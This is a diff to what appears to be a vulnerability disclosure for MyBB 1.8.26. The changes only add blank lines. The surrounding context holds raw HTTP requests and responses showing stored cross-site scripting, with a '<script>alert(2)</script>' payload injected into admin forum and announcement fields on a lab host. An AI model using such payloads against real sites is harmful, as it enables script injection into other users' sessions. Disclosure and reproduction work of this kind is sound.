@@ -63,6 +63,7 @@ To reproduce do the following:
 
 ```
 // HTTP POST request showing XSS payload
+
 POST /mybb_1826/admin/index.php?module=forum-management&action=add HTTP/1.1
 Host: 192.168.139.132
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 
@@ -73,6 +74,7 @@ script>&description="><script>alert(2)</script[...]
 
 
 // HTTP response showing successfully added a new forum
+
 HTTP/1.1 200 OK
 Date: Sun, 20 Nov 2022 11:00:28 GMT
 Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev 
@@ -81,13 +83,16 @@ Perl/v5.16.3
 
 
 // HTTP GET request to fetch forums
+
 GET /mybb_1826/admin/index.php?module=forum-management HTTP/1.1
 Host: 192.168.139.132
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 
 Firefox/106.0
 [...]
 
+
 // HTTP response showing unsanitized XSS payload
+
 HTTP/1.1 200 OK
 Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev 
 Perl/v5.16.3
@@ -107,6 +112,7 @@ To reproduce do the following:
 
 ```
 // HTTP POST request showing XSS payload
+
 POST /mybb_1826/admin/index.php?module=forum-announcements&action=add HTTP/1.1
 Host: 192.168.139.132
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 
@@ -118,7 +124,9 @@ tarttime_day=20&starttime_month=11&starttime_year=2022&starttime_time=11:05+AM&e
 ime_day=20&endtime_month=11&endtime_year=2023&endtime_time=11:05+AM&endtime_type=2&
 message="><script>alert(2)</script>&fid=2&allowmycode=1&allowsmilies=1
 
+
 // HTTP response showing successfully added an anouncement
+
 HTTP/1.1 302 Found
 Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev 
 Perl/v5.16.3
@@ -126,13 +134,16 @@ Perl/v5.16.3
 
 
 // HTTP GET request to fetch forum URL
+
 GET /mybb_1826/ HTTP/1.1
 Host: 192.168.139.132
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 
 Firefox/106.0
 [...]
 
+
 // HTTP response showing unsanitized XSS payload
+
 HTTP/1.1 200 OK
 Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev 
 Perl/v5.16.3
